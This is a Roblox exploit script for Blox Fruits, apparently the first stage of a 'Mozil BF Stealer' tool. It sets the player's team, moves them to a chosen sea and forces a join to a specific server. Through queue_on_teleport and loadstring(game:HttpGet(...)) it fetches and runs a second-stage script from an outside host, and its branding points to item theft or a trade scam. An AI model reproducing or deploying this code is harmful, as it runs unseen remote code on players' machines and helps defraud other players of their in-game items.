--// Mozil BF Trade – Script 1 (Sea Travel + queue Script 2)

local Players           = game:GetService("Players")
local LocalPlayer       = Players.LocalPlayer
local CoreGui           = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService   = game:GetService("TeleportService")
local TweenService      = game:GetService("TweenService")

local JOBID      = tostring((getgenv and getgenv().JOBID) or "")
local TARGET_SEA = tostring((getgenv and getgenv().SEA) or "2")
local USER       = tostring((getgenv and getgenv().USER) or "")
if JOBID == "" or JOBID == "PASTE_THE_JOBID_HERE" then
    LocalPlayer:Kick("Invalid or missing JobId!")
    return
end

local SEA_PLACE = {
    ["1"] = {2753915549},
    ["2"] = {4442272183, 79091703265657},
    ["3"] = {7449423635, 100117331123089},
}

local SEA_FROM_PLACE = {}
for sea, list in pairs(SEA_PLACE) do
    for _, placeId in ipairs(list) do
        SEA_FROM_PLACE[placeId] = sea
    end
end

local TARGET_LIST = SEA_PLACE[TARGET_SEA]
local TARGET_PLACE = TARGET_LIST and TARGET_LIST[1] or nil
if not TARGET_PLACE then
    LocalPlayer:Kick("Invalid SEA config!")
    return
end

--------------------------------------------------
-- Notification UI (MozilTradeNotifier)
--------------------------------------------------

local function getNotifyHolder()
    local NotiGui = CoreGui:FindFirstChild("MozilTradeNotifier")
    if not NotiGui then
        NotiGui = Instance.new("ScreenGui")
        NotiGui.Name = "MozilTradeNotifier"
        NotiGui.ResetOnSpawn = false
        NotiGui.IgnoreGuiInset = true
        NotiGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        NotiGui.Parent = CoreGui

        local holder = Instance.new("Frame")
        holder.Name = "Holder"
        holder.AnchorPoint = Vector2.new(1, 1)
        holder.Position = UDim2.new(1, -20, 1, -20)
        holder.Size = UDim2.new(0, 320, 0, 220)
        holder.BackgroundTransparency = 1
        holder.Parent = NotiGui

        local list = Instance.new("UIListLayout")
        list.Name = "ListLayout"
        list.FillDirection = Enum.FillDirection.Vertical
        list.VerticalAlignment = Enum.VerticalAlignment.Bottom
        list.HorizontalAlignment = Enum.HorizontalAlignment.Right
        list.Padding = UDim.new(0, 6)
        list.Parent = holder
    end

    return NotiGui:WaitForChild("Holder")
end

local Holder = getNotifyHolder()

local function Notify(title, text, duration)
    duration = duration or 3

    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(16, 18, 28)
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Size = UDim2.new(0, 280, 0, 0)        -- set sẵn width để TextBounds tính đúng
    frame.Parent = Holder

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(80, 180, 255)
    stroke.Thickness = 1.5
    stroke.Parent = frame

    local padding = Instance.new("UIPadding")
    padding.PaddingTop    = UDim.new(0, 8)
    padding.PaddingBottom = UDim.new(0, 8)
    padding.PaddingLeft   = UDim.new(0, 10)
    padding.PaddingRight  = UDim.new(0, 10)
    padding.Parent = frame

    local titleLbl = Instance.new("TextLabel")
    titleLbl.BackgroundTransparency = 1
    titleLbl.Font = Enum.Font.GothamSemibold
    titleLbl.TextSize = 14
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.TextColor3 = Color3.fromRGB(210, 230, 255)
    titleLbl.Text = title or "Mozil BF Stealer"
    titleLbl.Size = UDim2.new(1, 0, 0, 16)
    titleLbl.Parent = frame

    local msgLbl = Instance.new("TextLabel")
    msgLbl.BackgroundTransparency = 1
    msgLbl.Font = Enum.Font.Gotham
    msgLbl.TextSize = 13
    msgLbl.TextXAlignment = Enum.TextXAlignment.Left
    msgLbl.TextYAlignment = Enum.TextYAlignment.Top
    msgLbl.TextWrapped = true
    msgLbl.TextColor3 = Color3.fromRGB(190, 200, 220)
    msgLbl.TextTransparency = 0.1
    msgLbl.Text = text or ""
    msgLbl.Size = UDim2.new(1, 0, 0, 14)
    msgLbl.Parent = frame

    local layout = Instance.new("UIListLayout")
    layout.FillDirection = Enum.FillDirection.Vertical
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 2)
    layout.Parent = frame

    -- đợi 1 frame cho TextBounds update theo width 280
    task.wait()

    local height = titleLbl.TextBounds.Y + msgLbl.TextBounds.Y + 20
    local targetSize = UDim2.new(0, 280, 0, math.max(32, height))

    -- animate từ 0 → kích thước thật
    frame.Size = UDim2.new(0, 0, 0, 0)
    frame.BackgroundTransparency = 1

    TweenService:Create(
        frame,
        TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Size = targetSize, BackgroundTransparency = 0 }
    ):Play()

    task.delay(duration, function()
        if frame and frame.Parent then
            local tween = TweenService:Create(
                frame,
                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                { BackgroundTransparency = 1, Size = UDim2.new(0, 0, 0, 0) }
            )
            tween:Play()
            tween.Completed:Wait()
            if frame then frame:Destroy() end
        end
    end)
end

---------------------------------------------------------------------
--  QUEUE SCRIPT 2
---------------------------------------------------------------------

local SCRIPT2_URL = "https://luarmorfromtemu.vercel.app/api/loader/v1/2"

local function queueScript2()
    if typeof(queue_on_teleport) == "function" then
        queue_on_teleport(
            'getgenv().JOBID = "' .. JOBID .. '"; ' ..
            'getgenv().SEA = "' .. TARGET_SEA .. '"; ' ..
            'getgenv().USER = "' .. USER .. '"; ' ..
            'loadstring(game:HttpGet("' .. SCRIPT2_URL .. '"))()'
        )
    end
end
---------------------------------------------------------------------
--  TEAM HELPER (chọn Pirates trước khi travel SEA)
---------------------------------------------------------------------

local function ensurePiratesTeam()
    local comm
    pcall(function()
        comm = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
    end)
    if not comm then return end

    -- chọn team Pirates 1–2 lần cho chắc
    Notify("Mozil BF Trade", "Selecting Pirates team...", 3)
    for i = 1, 2 do
        pcall(function()
            comm:InvokeServer("SetTeam", "Pirates")
        end)
        task.wait(0.25)
    end

    -- delay ~1–2s cho Data/Remote load xong rồi mới travel
    task.wait(1.5)
end

---------------------------------------------------------------------
--  SEA TRAVEL LOGIC
---------------------------------------------------------------------

local currentPlace = game.PlaceId
local currentSea = SEA_FROM_PLACE[currentPlace]

Notify(
    "Mozil BF Stealer",
    string.format("Target Sea: %s | JobId: %s", TARGET_SEA, string.sub(JOBID, 1, 8) .. "..."),
    4
)
ensurePiratesTeam()

-- Đúng SEA -> chạy luôn Script 2
if currentSea == TARGET_SEA then
    Notify("Mozil BF Stealer", "Already in target sea – running join script...", 3)
    loadstring(game:HttpGet(SCRIPT2_URL))()
    return
end

-- Sai SEA -> queue Script 2 rồi dùng CommF_ / Teleport
Notify("Mozil BF Stealer", "Teleporting to Sea " .. TARGET_SEA .. "...", 4)
queueScript2()

local CommF
pcall(function()
    CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
end)

local ok = false

if CommF and currentSea and TARGET_SEA then
    if currentSea == "1" and TARGET_SEA == "2" then
        -- Sea 1 -> 2
        ok = pcall(function()
            CommF:InvokeServer("TravelDressrosa")
        end)
    elseif currentSea == "2" and TARGET_SEA == "3" then
        -- Sea 2 -> 3
        ok = pcall(function()
            CommF:InvokeServer("TravelZou")
        end)
    elseif currentSea == "3" and TARGET_SEA == "2" then
        -- Sea 3 -> 2
        ok = pcall(function()
            CommF:InvokeServer("TravelDressrosa")
        end)
    end
end

if not ok then
    -- fallback (game khác / remote lỗi)
    TeleportService:Teleport(TARGET_PLACE)
end
